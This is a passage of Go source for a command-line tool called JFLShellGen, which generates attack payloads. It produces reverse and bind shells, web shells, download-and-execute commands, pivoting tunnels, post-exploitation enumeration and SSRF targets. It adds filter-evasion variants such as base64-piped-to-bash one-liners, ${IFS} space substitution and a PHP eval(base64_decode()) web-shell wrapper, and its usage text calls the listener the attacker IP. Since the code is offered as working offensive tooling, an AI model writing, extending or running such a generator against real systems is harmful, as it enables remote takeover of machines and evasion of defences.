	variants = append(variants, payload)
	variants = append(variants, encodeBase64(payload))
	variants = append(variants, encodeURLEncode(payload))
	variants = append(variants, encodeHex(payload))
	variants = append(variants, fmt.Sprintf("echo %s | base64 -d | bash", encodeBase64(payload)))
	variants = append(variants, fmt.Sprintf("printf '%s' | xxd -r -p | bash", encodeHex(payload)))
	return variants
}

func generateObfuscatedVariants(payload string) []string {
	variants := make([]string, 0)
	variants = append(variants, payload)
	variants = append(variants, strings.ReplaceAll(payload, " ", "${IFS}"))
	variants = append(variants, strings.ReplaceAll(payload, " ", "$IFS$9"))
	variants = append(variants, strings.ReplaceAll(payload, "/", "${PATH:0:1}"))
	return variants
}

func generateReverseShells(lhost, lport, osFilter, shellFilter string, encode, obfuscate bool) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, t := range getReverseShellTemplates() {
		if osFilter != "" && osFilter != "all" && t.OS != osFilter {
			continue
		}
		if shellFilter != "" && t.Shell != shellFilter {
			continue
		}
		payload := strings.ReplaceAll(t.Template, "{{LHOST}}", lhost)
		payload = strings.ReplaceAll(payload, "{{LPORT}}", lport)
		results = append(results, GeneratedPayload{Category: "reverse_shell", Name: t.Name, OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: payload})
		if encode {
			for _, v := range generateEncodingVariants(payload) {
				if v != payload {
					results = append(results, GeneratedPayload{Category: "reverse_shell", Name: t.Name + "_encoded", OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: v})
				}
			}
		}
		if obfuscate {
			for _, v := range generateObfuscatedVariants(payload) {
				if v != payload {
					results = append(results, GeneratedPayload{Category: "reverse_shell", Name: t.Name + "_obfuscated", OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: v})
				}
			}
		}
	}
	return results
}

func generateBindShells(lport, osFilter, shellFilter string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, t := range getBindShellTemplates() {
		if osFilter != "" && osFilter != "all" && t.OS != osFilter {
			continue
		}
		if shellFilter != "" && t.Shell != shellFilter {
			continue
		}
		payload := strings.ReplaceAll(t.Template, "{{LPORT}}", lport)
		results = append(results, GeneratedPayload{Category: "bind_shell", Name: t.Name, OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: payload})
	}
	return results
}

func generateWebShells(langFilter string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, t := range getWebShellTemplates() {
		if langFilter != "" && t.Language != langFilter {
			continue
		}
		results = append(results, GeneratedPayload{Category: "web_shell", Name: t.Language + "_" + t.Type, OS: "any", Shell: t.Language, Type: t.Type, Payload: t.Template})
		if t.Language == "php" {
			b64 := encodeBase64(t.Template)
			results = append(results, GeneratedPayload{Category: "web_shell", Name: t.Language + "_" + t.Type + "_base64", OS: "any", Shell: t.Language, Type: t.Type, Payload: fmt.Sprintf("<?php eval(base64_decode('%s')); ?>", b64)})
		}
	}
	return results
}

func generateDownloadExecute(lhost, lport, osFilter string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, t := range getDownloadExecuteTemplates() {
		if osFilter != "" && osFilter != "all" && t.OS != osFilter {
			continue
		}
		payload := strings.ReplaceAll(t.Template, "{{LHOST}}", lhost)
		payload = strings.ReplaceAll(payload, "{{LPORT}}", lport)
		results = append(results, GeneratedPayload{Category: "download_execute", Name: t.Name, OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: payload})
	}
	return results
}

func generateTTYUpgrade() []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, cmd := range getTTYUpgradeTemplates() {
		results = append(results, GeneratedPayload{Category: "tty_upgrade", Name: "tty_upgrade", OS: "linux", Shell: "any", Type: "upgrade", Payload: cmd})
	}
	for _, cmd := range getStabilizationCommands() {
		results = append(results, GeneratedPayload{Category: "stabilization", Name: "stabilization", OS: "linux", Shell: "any", Type: "stabilize", Payload: cmd})
	}
	return results
}

func generatePivoting(lhost, lport, target, targetPort, pivot string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, t := range getPivotingTemplates() {
		payload := strings.ReplaceAll(t.Template, "{{LHOST}}", lhost)
		payload = strings.ReplaceAll(payload, "{{LPORT}}", lport)
		payload = strings.ReplaceAll(payload, "{{TARGET}}", target)
		payload = strings.ReplaceAll(payload, "{{TARGET_PORT}}", targetPort)
		payload = strings.ReplaceAll(payload, "{{PIVOT}}", pivot)
		results = append(results, GeneratedPayload{Category: "pivoting", Name: t.Name, OS: t.OS, Shell: t.Shell, Type: t.Type, Payload: payload})
	}
	return results
}

func generatePostExploit(os string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	var commands []string
	if os == "linux" || os == "all" {
		commands = append(commands, getPostExploitLinux()...)
	}
	if os == "windows" || os == "all" {
		commands = append(commands, getPostExploitWindows()...)
	}
	for _, cmd := range commands {
		results = append(results, GeneratedPayload{Category: "post_exploit", Name: "enumeration", OS: os, Shell: "any", Type: "enum", Payload: cmd})
	}
	return results
}

func generateSSRF(lhost, lport string) []GeneratedPayload {
	results := make([]GeneratedPayload, 0)
	for _, target := range getSSRFTargets() {
		payload := strings.ReplaceAll(target, "{{LHOST}}", lhost)
		payload = strings.ReplaceAll(payload, "{{LPORT}}", lport)
		results = append(results, GeneratedPayload{Category: "ssrf", Name: "ssrf_target", OS: "any", Shell: "http", Type: "ssrf", Payload: payload})
	}
	return results
}

func outputPlaintext(payloads []GeneratedPayload, w *bufio.Writer) error {
	for _, p := range payloads {
		_, err := w.WriteString(fmt.Sprintf("[%s] %s (%s/%s)\n%s\n\n", p.Category, p.Name, p.OS, p.Shell, p.Payload))
		if err != nil {
			return err
		}
	}
	return w.Flush()
}

func outputRaw(payloads []GeneratedPayload, w *bufio.Writer) error {
	for _, p := range payloads {
		_, err := w.WriteString(p.Payload + "\n")
		if err != nil {
			return err
		}
	}
	return w.Flush()
}

func outputJSON(payloads []GeneratedPayload, w *bufio.Writer) error {
	data, err := json.MarshalIndent(payloads, "", "  ")
	if err != nil {
		return err
	}
	_, err = w.Write(data)
	if err != nil {
		return err
	}
	_, err = w.WriteString("\n")
	return w.Flush()
}

func outputMarkdown(payloads []GeneratedPayload, w *bufio.Writer) error {
	_, err := w.WriteString("# JFLShellGen Output\n\n")
	if err != nil {
		return err
	}
	_, err = w.WriteString(fmt.Sprintf("Generated: %s\n\n", time.Now().Format(time.RFC3339)))
	if err != nil {
		return err
	}
	currentCategory := ""
	for _, p := range payloads {
		if p.Category != currentCategory {
			currentCategory = p.Category
			_, err = w.WriteString(fmt.Sprintf("## %s\n\n", strings.ToUpper(currentCategory)))
			if err != nil {
				return err
			}
		}
		_, err = w.WriteString(fmt.Sprintf("### %s (%s/%s)\n\n```\n%s\n```\n\n", p.Name, p.OS, p.Shell, p.Payload))
		if err != nil {
			return err
		}
	}
	return w.Flush()
}

func printUsage() {
	fmt.Fprintln(os.Stderr, "JFLShellGen v"+Version+" - "+DeveloperName)
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "Usage:")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type reverse -lhost 10.0.0.1 -lport 4444")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type bind -lport 4444")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type webshell -lang php")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type download -lhost 10.0.0.1 -lport 8080")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type tty")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type pivot -lhost 10.0.0.1 -lport 4444 -target 10.0.1.5 -target-port 80 -pivot 10.0.0.2")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type post -os linux")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type ssrf -lhost 10.0.0.1 -lport 4444")
	fmt.Fprintln(os.Stderr, "  jflshellgen -type all -lhost 10.0.0.1 -lport 4444")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "Flags:")
	fmt.Fprintln(os.Stderr, "  -type string       Payload type: reverse, bind, webshell, download, tty, pivot, post, ssrf, all")
	fmt.Fprintln(os.Stderr, "  -lhost string     Listener/attacker IP")
	fmt.Fprintln(os.Stderr, "  -lport string     Listener/attacker port")
	fmt.Fprintln(os.Stderr, "  -os string        OS filter: linux, windows, macos, all (default: all)")
	fmt.Fprintln(os.Stderr, "  -shell string     Shell filter: bash, python, powershell, etc.")
	fmt.Fprintln(os.Stderr, "  -lang string      Language filter for webshells: php, jsp, asp, aspx, python, ruby, nodejs, etc.")
	fmt.Fprintln(os.Stderr, "  -target string    Target IP for pivoting")
	fmt.Fprintln(os.Stderr, "  -target-port string Target port for pivoting")
	fmt.Fprintln(os.Stderr, "  -pivot string     Pivot host for tunneling")
	fmt.Fprintln(os.Stderr, "  -format string    Output format: plain, raw, json, markdown (default: plain)")
	fmt.Fprintln(os.Stderr, "  -o string         Output file (default: stdout)")
	fmt.Fprintln(os.Stderr, "  -encode           Include encoding variants (base64, url, hex)")
	fmt.Fprintln(os.Stderr, "  -obfuscate        Include obfuscation variants")
	fmt.Fprintln(os.Stderr, "  -q                Quiet mode")
}

func main() {
	rand.Seed(time.Now().UnixNano())

	typeFlag := flag.String("type", "", "Payload type: reverse, bind, webshell, download, tty, pivot, post, ssrf, all")
	lhostFlag := flag.String("lhost", "", "Listener/attacker IP")
	lportFlag := flag.String("lport", "", "Listener/attacker port")
	osFlag := flag.String("os", "all", "OS filter: linux, windows, macos, all")
	shellFlag := flag.String("shell", "", "Shell filter")
	langFlag := flag.String("lang", "", "Language filter for webshells")
	targetFlag := flag.String("target", "", "Target IP for pivoting")
	targetPortFlag := flag.String("target-port", "", "Target port for pivoting")
	pivotFlag := flag.String("pivot", "", "Pivot host for tunneling")
	formatFlag := flag.String("format", "plain", "Output format: plain, raw, json, markdown")
	outputFlag := flag.String("o", "", "Output file (default: stdout)")
	encodeFlag := flag.Bool("encode", false, "Include encoding variants")
	obfuscateFlag := flag.Bool("obfuscate", false, "Include obfuscation variants")
	quietFlag := flag.Bool("q", false, "Quiet mode")
	flag.Parse()

	if *typeFlag == "" {
		fmt.Fprintln(os.Stderr, "[ERROR] -type is required")
		printUsage()
		os.Exit(1)
	}

	validTypes := map[string]bool{
		"reverse": true, "bind": true, "webshell": true, "download": true,
		"tty": true, "pivot": true, "post": true, "ssrf": true, "all": true,
	}
	if !validTypes[*typeFlag] {
		fmt.Fprintf(os.Stderr, "[ERROR] Invalid type: %s\n", *typeFlag)
		printUsage()
		os.Exit(1)
	}

	if (*typeFlag == "reverse" || *typeFlag == "download" || *typeFlag == "all" || *typeFlag == "ssrf") && (*lhostFlag == "" || *lportFlag == "") {
		fmt.Fprintln(os.Stderr, "[ERROR] -lhost and -lport are required for this type")
		os.Exit(1)
	}
	if *typeFlag == "bind" && *lportFlag == "" {
		fmt.Fprintln(os.Stderr, "[ERROR] -lport is required for bind shell")
		os.Exit(1)
	}
	if *typeFlag == "pivot" && (*lhostFlag == "" || *lportFlag == "" || *targetFlag == "" || *targetPortFlag == "" || *pivotFlag == "") {
		fmt.Fprintln(os.Stderr, "[ERROR] -lhost, -lport, -target, -target-port, and -pivot are required for pivoting")
		os.Exit(1)
	}

	if !*quietFlag {
		fmt.Fprintf(os.Stderr, "[INFO] JFLShellGen v%s - %s\n", Version, DeveloperName)
		fmt.Fprintf(os.Stderr, "[INFO] Type: %s | OS: %s | Format: %s\n", *typeFlag, *osFlag, *formatFlag)
		if *encodeFlag {
			fmt.Fprintln(os.Stderr, "[INFO] Encoding variants enabled")
		}
		if *obfuscateFlag {
			fmt.Fprintln(os.Stderr, "[INFO] Obfuscation variants enabled")
		}
		fmt.Fprintln(os.Stderr, "[INFO] Generating payloads...")
	}

	allPayloads := make([]GeneratedPayload, 0)

	if *typeFlag == "reverse" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateReverseShells(*lhostFlag, *lportFlag, *osFlag, *shellFlag, *encodeFlag, *obfuscateFlag)...)
	}
	if *typeFlag == "bind" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateBindShells(*lportFlag, *osFlag, *shellFlag)...)
	}
	if *typeFlag == "webshell" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateWebShells(*langFlag)...)
	}
	if *typeFlag == "download" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateDownloadExecute(*lhostFlag, *lportFlag, *osFlag)...)
	}
	if *typeFlag == "tty" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateTTYUpgrade()...)
	}
	if *typeFlag == "pivot" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generatePivoting(*lhostFlag, *lportFlag, *targetFlag, *targetPortFlag, *pivotFlag)...)
	}
	if *typeFlag == "post" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generatePostExploit(*osFlag)...)
	}
	if *typeFlag == "ssrf" || *typeFlag == "all" {
		allPayloads = append(allPayloads, generateSSRF(*lhostFlag, *lportFlag)...)
	}

	seen := make(map[string]bool)
	uniquePayloads := make([]GeneratedPayload, 0)
	for _, p := range allPayloads {
		if !seen[p.Payload] {
			seen[p.Payload] = true
			uniquePayloads = append(uniquePayloads, p)
		}
	}

	var writer *bufio.Writer
	var outputFile *os.File
	if *outputFlag != "" {
		var err error
		outputFile, err = os.Create(*outputFlag)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[ERROR] Failed to create output file: %v\n", err)
			os.Exit(1)
		}
		defer outputFile.Close()
		writer = bufio.NewWriter(outputFile)
	} else {
		writer = bufio.NewWriter(os.Stdout)
	}

	var err error
	switch *formatFlag {
	case "plain":
		err = outputPlaintext(uniquePayloads, writer)
	case "raw":
		err = outputRaw(uniquePayloads, writer)
	case "json":
		err = outputJSON(uniquePayloads, writer)
	case "markdown":
		err = outputMarkdown(uniquePayloads, writer)
	default:
		fmt.Fprintf(os.Stderr, "[ERROR] Invalid format: %s\n", *formatFlag)
		os.Exit(1)
	}

	if err != nil {
		fmt.Fprintf(os.Stderr, "[ERROR] Failed to write output: %v\n", err)
		os.Exit(1)
	}

	if *outputFlag != "" && !*quietFlag {
		md5Hash, err := calculateMD5(*outputFlag)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[ERROR] Failed to calculate MD5: %v\n", err)
			os.Exit(1)
		}
		fmt.Fprintf(os.Stderr, "\n[INFO] Generated %d unique payloads\n", len(uniquePayloads))
		fmt.Fprintf(os.Stderr, "[INFO] Output: %s\n", *outputFlag)
		fmt.Fprintf(os.Stderr, "[INFO] MD5: %s\n", md5Hash)
	}

	if *quietFlag && *outputFlag != "" {
		fmt.Printf("%d\n", len(uniquePayloads))
		fmt.Printf("%s\n", *outputFlag)
	}
}
